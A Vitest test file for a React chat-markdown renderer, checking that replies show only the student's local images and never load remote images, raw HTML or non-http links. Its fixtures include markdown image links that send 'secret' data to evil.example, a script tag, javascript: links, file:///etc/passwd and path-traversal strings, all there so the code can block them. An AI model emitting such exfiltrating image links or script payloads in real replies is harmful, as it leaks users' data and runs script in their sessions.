import { cleanup, fireEvent, render, screen, within } from "@testing-library/react";
import { afterEach, describe, expect, test } from "vitest";
import { ChatMarkdown, chatUrl, imageTarget } from "./ChatMarkdown";
import { ImageViewerProvider } from "./ImageViewer";

afterEach(cleanup);

function draw(text: string): HTMLElement {
	return render(<ChatMarkdown text={text} />).container;
}

test("no form of image is ever drawn, so nothing loads from another host", () => {
	const view = draw(
		[
			"![leak](https://evil.example/x.png?d=secret)",
			"![ref][r]",
			"[r]: https://evil.example/r.png",
			'<img src="https://evil.example/tag.png">',
			"[![nested](https://evil.example/n.png)](https://example.com)",
		].join("\n\n"),
	);
	expect(view.querySelector("img")).toBeNull();
	expect(view.textContent).toContain("Remote image not shown: evil.example");
});

test("raw HTML is never turned into elements", () => {
	const view = draw(
		'Hello <b>bold</b> <script>alert(1)</script><iframe src="https://x"></iframe>',
	);
	expect(view.querySelector("b, script, iframe")).toBeNull();
});

test("links open in a new tab, without the opener or a referrer", () => {
	draw("See [the docs](https://example.com/docs).");
	const link = screen.getByRole("link", { name: "the docs" });
	expect(link.getAttribute("href")).toBe("https://example.com/docs");
	expect(link.getAttribute("target")).toBe("_blank");
	expect(link.getAttribute("rel")).toBe("noopener noreferrer");
});

test("a link that is not http or https is only text", () => {
	const view = draw(
		"[run](javascript:alert(1)) [file](file:///etc/passwd) <command:workbench> [rel](./a.md)",
	);
	expect(view.querySelector("a")).toBeNull();
	expect(view.textContent).toContain("run");
	expect(chatUrl("mailto:a@b")).toBe("");
	expect(chatUrl("HTTPS://example.com")).toBe("HTTPS://example.com");
});

test("Markdown renders: lists, code and tables", () => {
	const view = draw(
		"- one\n- two\n\n```ts\nconst x = 1;\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |",
	);
	expect(view.querySelectorAll("li")).toHaveLength(2);
	expect(view.querySelector("pre")?.getAttribute("tabindex")).toBe("0");
	expect(view.querySelector("table")).not.toBeNull();
});

// SPEC.md §24.1: a reply shows the student's own png, jpeg, gif or webp
// files and names every other image instead of loading it.
describe("images in a reply", () => {
	function drawInChat(text: string): HTMLElement {
		return render(
			<ImageViewerProvider workspaceId="w1" projectId="p1">
				<ChatMarkdown text={text} />
			</ImageViewerProvider>,
		).container;
	}

	test("the target rules: local images only, remote ones named", () => {
		expect(imageTarget(".portikus/images/home.png")).toEqual({
			kind: "local",
			path: ".portikus/images/home.png",
		});
		expect(imageTarget("./shot.JPG")).toEqual({ kind: "local", path: "shot.JPG" });
		expect(imageTarget("/home/student/portfolio-screenshot.png")).toEqual({
			kind: "local",
			path: "/home/student/portfolio-screenshot.png",
		});
		expect(imageTarget("file:///home/student/a%20b.webp")).toEqual({
			kind: "local",
			path: "/home/student/a b.webp",
		});
		expect(imageTarget("https://evil.example/x.png?d=1")).toEqual({
			kind: "remote",
			host: "evil.example",
		});
		expect(imageTarget("data:image/png;base64,AAAA")).toEqual({
			kind: "remote",
			host: "data URL",
		});
		for (const refused of [
			"logo.svg",
			"notes.txt",
			"../outside.png",
			"/home/student/../../etc/x.png",
			"javascript:alert(1)",
			"",
		]) {
			expect(imageTarget(refused), refused).toEqual({ kind: "missing" });
		}
	});

	test("a local image loads from the image route and opens in the viewer", async () => {
		const view = drawInChat(
			"Here it is: ![Portfolio screenshot](.portikus/images/home.png)",
		);
		const image = screen.getByRole("img", { name: "Portfolio screenshot" });
		expect(image.getAttribute("src")).toBe(
			"/workspaces/w1/projects/p1/image?path=.portikus%2Fimages%2Fhome.png",
		);
		expect(view.textContent).not.toContain("!");
		fireEvent.click(screen.getByRole("button", { name: "Portfolio screenshot" }));
		const dialog = await screen.findByRole("dialog", { name: "home.png" });
		expect(
			within(dialog).getByRole("img", { name: "Portfolio screenshot" }),
		).toBeTruthy();
	});

	test("a remote or data: image is named, never loaded", () => {
		const view = drawInChat(
			"![leak](https://evil.example/x.png?d=secret)\n\n![inline](data:image/png;base64,AAAA)",
		);
		expect(view.querySelector("img")).toBeNull();
		expect(view.textContent).toContain("Remote image not shown: evil.example");
		expect(view.textContent).toContain("Remote image not shown: data URL");
		expect(view.textContent).not.toContain("!leak");
	});

	test("an SVG, a non-image, an outside path and a missing file say not found", () => {
		const view = drawInChat(
			"![a](logo.svg) ![b](notes.txt) ![c](../outside.png) ![d](gone.png)",
		);
		expect(view.textContent).toContain("Image not found: logo.svg");
		expect(view.textContent).toContain("Image not found: notes.txt");
		expect(view.textContent).toContain("Image not found: ../outside.png");
		// The route refuses a missing file, and the image's error shows the note.
		fireEvent.error(screen.getByRole("img", { name: "d" }));
		expect(view.textContent).toContain("Image not found: gone.png");
		expect(view.querySelectorAll("img")).toHaveLength(0);
	});
});
